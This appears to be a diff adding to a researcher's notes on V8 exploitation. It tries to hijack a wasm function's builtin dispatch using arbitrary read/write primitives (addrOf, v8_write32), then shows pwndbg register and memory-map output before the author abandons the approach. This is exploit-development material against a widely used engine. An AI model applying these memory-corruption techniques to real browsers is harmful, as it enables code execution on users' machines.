@@ -1126,3 +1126,77 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ```
 
 **New idea: changing wasm function to make rbx controlable**
+
+rbx is changed 0xffff
+```js
+
+let a = Array(2).fill(kWasmI64);
+let $sig_v_a = builder.addType(makeSig([],a)); 
+builder.addFunction("func1", $sig_v_a)
+    .exportFunc()
+    .addBody([
+        kExprI64Const, 0x20,
+        kExprI64Const, 0,
+    ]);
+
+let instance = builder.instantiate();
+
+instance.exports.func1(0n);
+// eval("")
+
+%DebugPrint(instance.exports.func1);
+// ===============================
+// 0x2a7ada
+// %SystemBreak();
+let id_builtins_function = Number(v8_read32(addrOf(instance.exports.func1)+0xb+1));
+console.log("0x" + id_builtins_function.toString(16));
+
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x2000)*0x200);
+// v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), 0x41414141);
+console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
+
+// 
+v8_write32(0x180d35n + 0x27n, 0x41414141);
+v8_write32(0x1816c9n + 3n, 0x400600);
+// v8_write64(0x200145n - 1n, 0x4141414142424242n);
+
+// trigger
+// target_page
+foo(1, 0x414141n);
+instance.exports.func1(0x4141414141n);
+// instance.exports.func1(123n);
+//===============
+Thread 1 "d8" hit Breakpoint 4, 0x0000555556ae74d3 in Builtins_CallFunction_ReceiverIsAny ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
+*RAX  0x2
+*RBX  0xffffffffffffffff
+*RCX  0x20000
+*RDX  0xbd600000069 ◂— 0x4
+*RDI  0xbd6001dd105 ◂— 0x2500000725001923
+*RSI  0xbd600181729 ◂— 0x450000024e001817
+*R8   0xbd600199da9 ◂— 0x5500000020001902
+*R9   0xfffffffffffffff7
+*R10  0x7fff98000000 ◂— 0x0
+*R11  0xed
+*R12  0x14ec00000645 ◂— 0x9600400200000009 /* '\t' */
+*R13  0x555556fa6080 —▸ 0x555556ae6f00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
+*R14  0xbd600000000 ◂— 0x40940
+*R15  0x4f5
+*RBP  0x7fffffffd730 —▸ 0x7fffffffd758 —▸ 0x7fffffffd7d0 —▸ 0x7fffffffd930 —▸ 0x7fffffffd9a0 ◂— ...
+*RSP  0x7fffffffd6a8 —▸ 0x555556af2ca7 (Builtins_InterpreterEntryTrampoline+295) ◂— mov r12, qword ptr [rbp - 0x20]
+*RIP  0x555556ae74d3 (Builtins_CallFunction_ReceiverIsAny+275) ◂— mov rcx, qword ptr [r10 + rcx]
+─────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x555556ae74d3 <Builtins_CallFunction_ReceiverIsAny+275>    mov    rcx, qword ptr [r10 + rcx]
+   0x555556ae74d7 <Builtins_CallFunction_ReceiverIsAny+279>    jmp    
+```
+
+We can jump to value's address in range [0x7fff98010000-0x7fffff0:0x7fff98010000+0x7fffff0], but none of them is useful...
+```js
+    0x7fff78030000     0x7fff98000000 ---p 1ffd0000      0 [anon_7fff78030]
+    0x7fff98000000     0x7fff98010000 r--p    10000      0 [anon_7fff98000]
+    0x7fff98010000     0x7fff98030000 rw-p    20000      0 [anon_7fff98010] <== us
+    0x7fff98030000     0x7fffa0000000 ---p  7fd0000      0 [anon_7fff98030]
+```
+
+**Stop inversting here**
